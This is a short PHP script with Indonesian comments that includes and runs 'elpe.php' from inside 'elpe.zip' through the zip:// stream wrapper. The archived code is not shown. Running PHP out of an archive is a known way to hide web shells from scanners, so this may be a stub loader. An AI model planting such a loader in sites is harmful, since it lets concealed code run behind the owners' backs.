<?php

$zipFile = 'elpe.zip';
$phpFileInArchive = 'elpe.php';

// Gunakan stream wrapper zip://
// Format: zip://[path_ke_zip]#[file_di_dalamnya]
$filePath = "zip://{$zipFile}#{$phpFileInArchive}";

if (file_exists($zipFile)) {
    include $filePath;
} else {
    error_log("Error: '{$phpFileInArchive}' tidak ditemukan di dalam '{$zipFile}' atau file zip tidak dapat diakses.");
}

?>